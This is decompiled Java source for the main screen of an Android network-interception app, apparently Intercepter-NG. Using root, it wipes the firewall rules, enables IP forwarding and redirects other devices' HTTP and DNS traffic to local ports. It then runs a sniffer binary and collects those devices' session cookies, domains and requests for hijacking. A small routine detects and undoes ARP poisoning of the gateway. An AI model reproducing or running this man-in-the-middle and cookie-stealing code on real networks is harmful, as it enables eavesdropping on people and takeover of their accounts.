package su.sniff.cepter;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.res.Configuration;
import android.graphics.Typeface;
import android.os.Bundle;
import android.os.Environment;
import android.support.v4.view.MotionEventCompat;
import android.text.Html;
import android.text.Spannable;
import android.text.SpannableString;
import android.text.style.ForegroundColorSpan;
import android.util.Log;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.ScrollView;
import android.widget.TextView;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import su.sniff.cepter.OpenFileDialog.OnFileSelectedListener;
import su.sniff.cepter.SaveFileDialog.OnNewFileSelectedListener;

public class MainActivity extends Activity {
    static TextView tvHello;
    static ListView tvList;
    String TAG = "MainActivity";
    String cmd;
    String cmd2;
    Activity mActivity;
    public Context mCtx;
    Process sniff_process = null;

    class C00583 implements Runnable {
        C00583() {
        }

        public void run() {
            try {
                Process process2 = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(process2.getOutputStream());
                os.writeBytes("iptables -F;iptables -X;iptables -t nat -F;iptables -t nat -X;iptables -t mangle -F;iptables -t mangle -X;iptables -P INPUT ACCEPT;iptables -P FORWARD ACCEPT;iptables -P OUTPUT ACCEPT\n");
                os.flush();
                os.writeBytes("echo '1' > /proc/sys/net/ipv4/ip_forward\n");
                os.flush();
                os.writeBytes("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8081\n");
                os.flush();
                if (globalVariable.dnss == 1) {
                    os.writeBytes("iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 8053\n");
                    os.flush();
                }
                os.writeBytes("exit\n");
                os.flush();
                os.close();
                process2.waitFor();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (InterruptedException e2) {
                e2.printStackTrace();
            }
        }
    }

    class C01275 implements OnNewFileSelectedListener {
        C01275() {
        }

        public void onNewFileSelected(File f) {
            String buf = MainActivity.tvHello.getText().toString();
            try {
                FileWriter writer = new FileWriter(f);
                writer.append(buf);
                writer.flush();
                writer.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    class C01286 implements OnFileSelectedListener {
        C01286() {
        }

        public void onFileSelected(File f) {
            String sc;
            if (globalVariable.savepcap == 1) {
                sc = " w ";
            } else {
                sc = " ";
            }
            MainActivity.tvHello.setTextSize(2, (float) globalVariable.raw_textsize);
            ((TextView) MainActivity.this.findViewById(R.id.textView1)).setTextSize(2, (float) globalVariable.raw_textsize);
            File fDroidSheep = new File("/data/data/su.sniff.cepter/files/exits.id");
            if (fDroidSheep.exists()) {
                fDroidSheep.delete();
            }
            try {
                final Process process = Runtime.getRuntime().exec("su", null, new File("/data/data/su.sniff.cepter/files"));
                DataOutputStream os = new DataOutputStream(process.getOutputStream());
                os.writeBytes("/data/data/su.sniff.cepter/files/cepter " + f.getAbsolutePath() + " " + Integer.toString(globalVariable.resurrection) + "\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();
                os.close();
                MainActivity.this.sniff_process = process;
                new Thread(new Runnable() {
                    public void run() {
                        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        while (true) {
                            try {
                                String line = reader.readLine();
                                if (line == null) {
                                    reader.close();
                                    process.waitFor();
                                    return;
                                }
                                final String temp = line;
                                if (temp.indexOf("###STAT###") != -1) {
                                    MainActivity.this.runOnUiThread(new Runnable() {
                                        public void run() {
                                            int b = temp.indexOf("###STAT###") + 11;
                                            ((TextView) MainActivity.this.findViewById(R.id.textView1)).setText(temp.substring(b, (temp.length() - b) + 11));
                                        }
                                    });
                                } else if (temp.indexOf("REQ###") != -1) {
                                    if (globalVariable.showhttp == 1) {
                                        MainActivity.this.runOnUiThread(new Runnable() {
                                            public void run() {
                                                MainActivity.tvHello.append(temp.substring(6, temp.length() - 6));
                                                MainActivity.tvHello.append("\n");
                                            }
                                        });
                                    }
                                } else if (temp.indexOf("Cookie###") != -1) {
                                    final String domain = reader.readLine();
                                    final String ip = reader.readLine();
                                    final String getreq = reader.readLine();
                                    final String coo = reader.readLine();
                                    String z = reader.readLine();
                                    if (!ip.equals(globalVariable.own_ip)) {
                                        int dub = 0;
                                        for (int i = 0; i < globalVariable.cookies_c; i++) {
                                            if (((String) globalVariable.cookies_value.get(i)).equals(coo)) {
                                                dub = 1;
                                                break;
                                            }
                                        }
                                        if (dub != 1) {
                                            MainActivity.this.runOnUiThread(new Runnable() {
                                                public void run() {
                                                    if (globalVariable.lock == 0) {
                                                        globalVariable.lock = 1;
                                                    } else {
                                                        while (globalVariable.lock == 1) {
                                                            try {
                                                                Thread.sleep(1);
                                                            } catch (InterruptedException e) {
                                                                e.printStackTrace();
                                                            }
                                                        }
                                                        globalVariable.lock = 1;
                                                    }
                                                    globalVariable.cookies_domain.add(globalVariable.cookies_c, domain + " : " + ip);
                                                    globalVariable.cookies_domain2.add(globalVariable.cookies_c, "<font color=\"#00aa00\"><b>" + domain + " : " + ip + "</b></font><br>" + "<font color=\"#397E7E\">" + coo + "</font>");
                                                    globalVariable.adapter.notifyDataSetChanged();
                                                    globalVariable.adapter2.notifyDataSetChanged();
                                                    globalVariable.cookies_getreq.add(globalVariable.cookies_c, getreq);
                                                    globalVariable.cookies_value.add(globalVariable.cookies_c, coo);
                                                    globalVariable.cookies_ip.add(globalVariable.cookies_c, ip);
                                                    globalVariable.cookies_getreq2.add(globalVariable.cookies_c, getreq);
                                                    globalVariable.cookies_value2.add(globalVariable.cookies_c, coo);
                                                    globalVariable.cookies_ip2.add(globalVariable.cookies_c, ip);
                                                    globalVariable.cookies_c++;
                                                    globalVariable.lock = 0;
                                                }
                                            });
                                        }
                                    }
                                } else {
                                    MainActivity.this.runOnUiThread(new Runnable() {
                                        public void run() {
                                            if (temp.indexOf("intercepted") != -1) {
                                                Spannable WordtoSpan = new SpannableString(temp);
                                                WordtoSpan.setSpan(new ForegroundColorSpan(-1), 0, temp.length(), 33);
                                                MainActivity.tvHello.append(WordtoSpan);
                                            } else {
                                                MainActivity.tvHello.append(temp);
                                            }
                                            MainActivity.tvHello.append("\n");
                                            ScrollView scrollview = (ScrollView) MainActivity.this.findViewById(R.id.scrollview);
                                            if (globalVariable.raw_autoscroll == 1) {
                                                scrollview.scrollTo(0, MainActivity.tvHello.getHeight());
                                            }
                                        }
                                    });
                                }
                            } catch (IOException e) {
                            } catch (InterruptedException e2) {
                                e2.printStackTrace();
                            }
                        }
                    }
                }).start();
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        }
    }

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(3);
        setContentView(R.layout.activity_main);
        getWindow().setFeatureDrawableResource(3, R.drawable.ico);
        tvHello = (TextView) findViewById(R.id.editText1);
        this.mActivity = this;
        this.mCtx = this;
        globalVariable.adapter = new ArrayAdapter<String>(this, R.layout.raw_list2, R.id.label, globalVariable.cookies_domain) {
            public View getView(int position, View convertView, ViewGroup parent) {
                if (convertView == null) {
                    convertView = ((LayoutInflater) getContext().getSystemService("layout_inflater")).inflate(R.layout.raw_list2, parent, false);
                }
                TextView tt = (TextView) convertView.findViewById(R.id.label);
                tt.setText(Html.fromHtml((String) getItem(position)));
                tt.setTextSize(2, (float) globalVariable.raw_textsize);
                tt.setTypeface(Typeface.MONOSPACE);
                return convertView;
            }
        };
        globalVariable.adapter2 = new ArrayAdapter<String>(this, R.layout.raw_list2, R.id.label, globalVariable.cookies_domain2) {
            public View getView(int position, View convertView, ViewGroup parent) {
                if (convertView == null) {
                    convertView = ((LayoutInflater) getContext().getSystemService("layout_inflater")).inflate(R.layout.raw_list2, parent, false);
                }
                TextView tt = (TextView) convertView.findViewById(R.id.label);
                tt.setText(Html.fromHtml((String) getItem(position)));
                tt.setTextSize(2, (float) globalVariable.raw_textsize);
                tt.setTypeface(Typeface.MONOSPACE);
                return convertView;
            }
        };
        this.cmd = getIntent().getExtras().getString("Key_String");
        this.cmd2 = getIntent().getExtras().getString("Key_String_origin");
        tvHello.setTypeface(Typeface.MONOSPACE);
    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode != 4) {
            return super.onKeyDown(keyCode, event);
        }
        try {
            openFileOutput("exits.id", 0).close();
            openFileOutput("exitr.id", 0).close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e2) {
            e2.printStackTrace();
        }
        Log.d(TAG, "at the end");
        Intent i = new Intent(this.mCtx, ScanActivity.class);
        i.putExtra("Key_String", this.cmd2);
        startActivity(i);
        finish();
        return false;
    }

    public void clk_run(View v) throws IOException {
        Process process2;
        if (this.sniff_process != null) {
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            ((ImageView) findViewById(R.id.imageView5)).setImageResource(R.drawable.start);
            openFileOutput("exits.id", 0).close();
            this.sniff_process = null;
            if (globalVariable.strip == 1) {
                process2 = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(process2.getOutputStream());
                os.writeBytes("iptables -F;iptables -X;iptables -t nat -F;iptables -t nat -X;iptables -t mangle -F;iptables -t mangle -X;iptables -P INPUT ACCEPT;iptables -P FORWARD ACCEPT;iptables -P OUTPUT ACCEPT\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();
                os.close();
                try {
                    process2.waitFor();
                    return;
                } catch (InterruptedException e2) {
                    e2.printStackTrace();
                    return;
                }
            }
            return;
        }
        String sc;
        ((ImageView) findViewById(R.id.imageView5)).setImageResource(R.drawable.stop);
        Context cc = this;
        if (globalVariable.savepcap == 1) {
            sc = " w ";
        } else {
            sc = " ";
        }
        tvHello.setTextSize(2, (float) globalVariable.raw_textsize);
        ((TextView) findViewById(R.id.textView1)).setTextSize(2, (float) globalVariable.raw_textsize);
        File fDroidSheep = new File("/data/data/su.sniff.cepter/files/exits.id");
        if (fDroidSheep.exists()) {
            fDroidSheep.delete();
        }
        if (globalVariable.strip == 1) {
            new Thread(new C00583()).start();
        } else {
            try {
                process2 = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(process2.getOutputStream());
                os.writeBytes("iptables -F;iptables -X;iptables -t nat -F;iptables -t nat -X;iptables -t mangle -F;iptables -t mangle -X;iptables -P INPUT ACCEPT;iptables -P FORWARD ACCEPT;iptables -P OUTPUT ACCEPT\n");
                os.flush();
                os.writeBytes("echo '1' > /proc/sys/net/ipv4/ip_forward\n");
                os.flush();
                if (globalVariable.dnss == 1) {
                    os.writeBytes("iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 8053\n");
                    os.flush();
                }
                os.writeBytes("exit\n");
                os.flush();
                os.close();
                process2.waitFor();
            } catch (IOException e3) {
                e3.printStackTrace();
            } catch (InterruptedException e22) {
                e22.printStackTrace();
            }
        }
        final Process process = Runtime.getRuntime().exec("su", null, new File("/data/data/su.sniff.cepter/files"));
        DataOutputStream os = new DataOutputStream(process.getOutputStream());
        os.writeBytes("/data/data/su.sniff.cepter/files/cepter " + Integer.toString(globalVariable.adapt_num) + " " + Integer.toString(globalVariable.resurrection) + sc + this.cmd + "\n");
        os.flush();
        os.writeBytes("exit\n");
        os.flush();
        os.close();
        this.sniff_process = process;
        new Thread(new Runnable() {

            class C00591 implements Runnable {
                C00591() {
                }

                public void run() {
                    MainActivity.tvHello.append("*\n");
                }
            }

            public void run() {
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                while (true) {
                    try {
                        String line = reader.readLine();
                        if (line == null) {
                            reader.close();
                            process.waitFor();
                            MainActivity.this.runOnUiThread(new C00591());
                            return;
                        }
                        final String temp = line;
                        if (temp.indexOf("###STAT###") != -1) {
                            MainActivity.this.runOnUiThread(new Runnable() {
                                public void run() {
                                    int b = temp.indexOf("###STAT###") + 11;
                                    ((TextView) MainActivity.this.findViewById(R.id.textView1)).setText(temp.substring(b, (temp.length() - b) + 11));
                                }
                            });
                        } else if (temp.indexOf("REQ###") != -1) {
                            if (globalVariable.showhttp == 1) {
                                MainActivity.this.runOnUiThread(new Runnable() {
                                    public void run() {
                                        MainActivity.tvHello.append(temp.substring(6, temp.length() - 6));
                                        MainActivity.tvHello.append("\n");
                                    }
                                });
                            }
                        } else if (temp.indexOf("Cookie###") != -1) {
                            final String domain = reader.readLine();
                            final String ip = reader.readLine();
                            final String getreq = reader.readLine();
                            final String coo = reader.readLine();
                            String z = reader.readLine();
                            if (!ip.equals(globalVariable.own_ip)) {
                                int dub = 0;
                                for (int i = 0; i < globalVariable.cookies_c; i++) {
                                    if (((String) globalVariable.cookies_value.get(i)).equals(coo)) {
                                        dub = 1;
                                        break;
                                    }
                                }
                                if (dub != 1) {
                                    MainActivity.this.runOnUiThread(new Runnable() {
                                        public void run() {
                                            if (globalVariable.lock == 0) {
                                                globalVariable.lock = 1;
                                            } else {
                                                while (globalVariable.lock == 1) {
                                                    try {
                                                        Thread.sleep(1);
                                                    } catch (InterruptedException e) {
                                                        e.printStackTrace();
                                                    }
                                                }
                                                globalVariable.lock = 1;
                                            }
                                            globalVariable.cookies_domain.add(globalVariable.cookies_c, domain + " : " + ip);
                                            globalVariable.cookies_domain2.add(globalVariable.cookies_c, "<font color=\"#00aa00\"><b>" + domain + " : " + ip + "</b></font><br>" + "<font color=\"#397E7E\">" + coo + "</font>");
                                            globalVariable.adapter.notifyDataSetChanged();
                                            globalVariable.adapter2.notifyDataSetChanged();
                                            globalVariable.cookies_getreq.add(globalVariable.cookies_c, getreq);
                                            globalVariable.cookies_value.add(globalVariable.cookies_c, coo);
                                            globalVariable.cookies_ip.add(globalVariable.cookies_c, ip);
                                            globalVariable.cookies_getreq2.add(globalVariable.cookies_c, getreq);
                                            globalVariable.cookies_value2.add(globalVariable.cookies_c, coo);
                                            globalVariable.cookies_ip2.add(globalVariable.cookies_c, ip);
                                            globalVariable.cookies_c++;
                                            globalVariable.lock = 0;
                                        }
                                    });
                                }
                            }
                        } else {
                            MainActivity.this.runOnUiThread(new Runnable() {
                                public void run() {
                                    if (temp.indexOf("intercepted") != -1) {
                                        Spannable WordtoSpan = new SpannableString(temp);
                                        WordtoSpan.setSpan(new ForegroundColorSpan(-1), 0, temp.length(), 33);
                                        MainActivity.tvHello.append(WordtoSpan);
                                    } else {
                                        MainActivity.tvHello.append(temp);
                                    }
                                    MainActivity.tvHello.append("\n");
                                    ScrollView scrollview = (ScrollView) MainActivity.this.findViewById(R.id.scrollview);
                                    if (globalVariable.raw_autoscroll == 1) {
                                        scrollview.scrollTo(0, MainActivity.tvHello.getHeight() + 50);
                                    }
                                }
                            });
                        }
                    } catch (IOException e) {
                    } catch (InterruptedException e2) {
                        e2.printStackTrace();
                    }
                }
            }
        }).start();
    }

    public void OnCLS(View v) {
        tvHello.setText(BuildConfig.FLAVOR);
    }

    public void OnBack(View v) throws IOException {
        if (this.sniff_process != null) {
            openFileOutput("exits.id", 0).close();
            openFileOutput("exitr.id", 0).close();
            this.sniff_process = null;
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        Intent i = new Intent(this.mCtx, ScanActivity.class);
        i.putExtra("Key_String", this.cmd2);
        startActivity(i);
        finish();
    }

    public void OnSave(View v) {
        new SaveFileDialog(this, Environment.getExternalStorageDirectory().getAbsolutePath(), new String[]{".txt"}, new C01275()).show();
    }

    public void OnOpenCap(View v) {
        new OpenFileDialog(this, globalVariable.PCAP_PATH, new String[]{".pcap"}, new C01286()).show();
    }

    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
    }

    public void OnDefend(View v) throws IOException, InterruptedException {
        String[] maclist = new String[MotionEventCompat.ACTION_MASK];
        String[] iplist = new String[MotionEventCompat.ACTION_MASK];
        BufferedReader bufferedReader = new BufferedReader(new FileReader("/proc/net/arp"));
        int c = 0;
        String MAC_RE = "^%s\\s+0x1\\s+0x2\\s+([:0-9a-fA-F]+)\\s+\\*\\s+\\w+$";
        while (true) {
            String read = bufferedReader.readLine();
            if (read == null) {
                break;
            }
            String ip = read.substring(0, read.indexOf(" "));
            Matcher matcher = Pattern.compile(String.format(MAC_RE, new Object[]{ip.replace(".", "\\.")})).matcher(read);
            if (matcher.matches()) {
                String mac = matcher.group(1);
                String z2 = ip + ":" + mac + "\n";
                maclist[c] = mac;
                iplist[c] = ip;
                c++;
            }
        }
        bufferedReader.close();
        boolean found = false;
        int i = 0;
        while (i < c) {
            int a = 0;
            while (a < c) {
                if (maclist[a].equals(maclist[i]) && a != i && globalVariable.gw_ip.equals(iplist[i])) {
                    tvHello.append("Warning! Gateway poisoned by " + iplist[a] + " - " + maclist[a] + "\n");
                    found = true;
                    Process process2 = Runtime.getRuntime().exec("su", null, new File("/data/data/su.sniff.cepter/files"));
                    DataOutputStream dataOutputStream = new DataOutputStream(process2.getOutputStream());
                    bufferedReader = new BufferedReader(new InputStreamReader(process2.getInputStream()));
                    Log.d(TAG, "Exec: cepter " + Integer.toString(globalVariable.adapt_num) + " -r " + globalVariable.gw_ip);
                    dataOutputStream.writeBytes("/data/data/su.sniff.cepter/files/cepter " + Integer.toString(globalVariable.adapt_num) + " -r " + globalVariable.gw_ip + "\n");
                    dataOutputStream.flush();
                    dataOutputStream.writeBytes("exit\n");
                    dataOutputStream.flush();
                    dataOutputStream.close();
                    String read = bufferedReader.readLine();
                    String m = read.substring(read.indexOf(58) + 1, read.length());
                    bufferedReader.close();
                    process2.waitFor();
                    m = m.replaceAll("-", ":");
                    tvHello.append("Restoring original mac - " + m + "\n");
                    Process process3 = Runtime.getRuntime().exec("su", null, new File("/system/bin"));
                    dataOutputStream = new DataOutputStream(process3.getOutputStream());
                    dataOutputStream.writeBytes("LD_LIBRARY_PATH=/data/data/su.sniff.cepter/files /data/data/su.sniff.cepter/files/busybox arp -s " + globalVariable.gw_ip + " " + m + "\n");
                    dataOutputStream.flush();
                    dataOutputStream.writeBytes("exit\n");
                    dataOutputStream.flush();
                    dataOutputStream.close();
                    process3.waitFor();
                    break;
                }
                a++;
            }
            i++;
        }
        if (!found) {
            tvHello.append("ARP Cache is clean. No attacks detected.\n");
        }
    }
}
